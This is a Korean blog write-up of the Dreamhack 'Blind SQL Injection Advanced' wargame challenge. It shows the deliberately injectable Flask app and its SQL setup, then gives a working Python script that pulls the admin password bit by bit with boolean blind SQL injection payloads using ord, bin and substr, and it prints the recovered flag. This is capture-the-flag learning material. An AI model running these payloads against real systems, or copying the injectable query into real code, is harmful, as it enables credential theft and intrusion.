---
title : Dreamhack - Blind SQL Injection Advanced
categories: [Dreamhack, Webhacking]
date: 2022-03-31 22:10 +0900
tags: [blind sql injection, dreamhack, dreamhack blind sql injection advanced]
---

## Blind SQL Injection Advanced
<hr style="border-top: 1px solid;"><br>

```python
import os
from flask import Flask, request, render_template_string
from flask_mysqldb import MySQL

app = Flask(__name__)
app.config['MYSQL_HOST'] = os.environ.get('MYSQL_HOST', 'localhost')
app.config['MYSQL_USER'] = os.environ.get('MYSQL_USER', 'user')
app.config['MYSQL_PASSWORD'] = os.environ.get('MYSQL_PASSWORD', 'pass')
app.config['MYSQL_DB'] = os.environ.get('MYSQL_DB', 'user_db')
mysql = MySQL(app)

template ='''
<pre style="font-size:200%">SELECT * FROM users WHERE uid='{{uid}}';</pre><hr/>
<form>
    <input tyupe='text' name='uid' placeholder='uid'>
    <input type='submit' value='submit'>
</form>
{% if nrows == 1%}
    <pre style="font-size:150%">user "{{uid}}" exists.</pre>
{% endif %}
'''

@app.route('/', methods=['GET'])
def index():
    uid = request.args.get('uid', '')
    nrows = 0

    if uid:
        cur = mysql.connection.cursor()
        nrows = cur.execute(f"SELECT * FROM users WHERE uid='{uid}';")

    return render_template_string(template, uid=uid, nrows=nrows)


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

<br>

```php
CREATE DATABASE user_db CHARACTER SET utf8;
GRANT ALL PRIVILEGES ON user_db.* TO 'dbuser'@'localhost' IDENTIFIED BY 'dbpass';

USE `user_db`;
CREATE TABLE users (
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO users (uid, upw) values ('admin', 'DH{**FLAG**}');
INSERT INTO users (uid, upw) values ('guest', 'guest');
INSERT INTO users (uid, upw) values ('test', 'test');
FLUSH PRIVILEGES;

```

<br>

![image](https://user-images.githubusercontent.com/52172169/161065444-91705e02-5003-4878-9cf6-d562df1a6669.png)

<br>

관리자의 비밀번호는 "아스키코드"와 "한글"로 구성되어 있습니다.

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

upw 길이는 27이라고 생각할 수 있으나 한글 즉, unicode가 껴있기 때문에 확실하지 않다.
: 비밀번호의 정확한 길이는 char_length 함수를 이용해서 구할 수 있다.
: CHAR_LENGTH 함수는 문자의 Byte 수를 계산하지 않고 단순히 몇 개의 문자가 있는지를 가져오는 함수

<br>

따라서 ascii 함수 대신에 멀티바이트 문자도 계산해주는 ord 함수를 사용해야 한다.

아스키코드 값은 1바이트(8비트), 멀티바이트는 2바이트(16비트), n바이트이다.

```python
import requests

url='http://host1.dreamhack.games:{port}/'
headers={'Content-Type':'application/x-www-form-urlencoded'}

upw='DH{'

for i in range(4,50): # 비밀번호 길이는 char_length로 정확하게 구할 수 있었음
	bit_len=0
	for j in range(1,33):
		payload={'uid':"admin' and if(length(bin(ord(substr(upw,"+str(i)+",1))))="+str(j)+",1,0)#"}
		res=requests.get(url, headers=headers, params=payload)
		if "exists" in res.text:
			bit_len=j
			break
			
	print("bit_len : "+str(bit_len))
	sub_bit=''
	for k in range(1,bit_len+1):
		payload={'uid':"admin' and if(substr(bin(ord(substr(upw,"+str(i)+",1))),"+str(k)+",1)=1,1,0)#"}
		res=requests.get(url,headers=headers, params=payload)
		if "exist" in res.text:
			sub_bit+='1'
		else:
			sub_bit+='0'

	print("bit: {}".format(sub_bit))
	# upw+=chr(int(sub_bit,2))
	upw+=int.to_bytes(int(sub_bit,2),(bit_len+7)//8, "big").decode("utf-8") # 기본 8bit 단위로 나누는 것
	print("upw : {}".format(upw))
```

<br>

Rubiya의 XAVIS 문제를 풀 때도 비밀번호가 멀티바이트인 한글로 되어있어서 chr을 이용해서 바꿨었는데 그 때는 16bit여서 chr로 충분히 가능했던 것 같다.

16bit은 chr이 변환 가능한 값의 최대값인 0x110000(```1 0001 0000 0000 0000 0000```)에서 벗어나지 않기 때문이다.

이번에는 24bit이기도 했고, 0x110000에도 벗어나서 chr로는 할 수 없었던 것. 

웬만하면 정수를 바이트로 변환할 때는 ```int.to_bytes```를 이용하는 것이 편할 것 같다.

<br>

+ Flag : ```DH{이것이비밀번호!?}```

<br><br>
<hr style="border: 2px solid;">
<br><br>
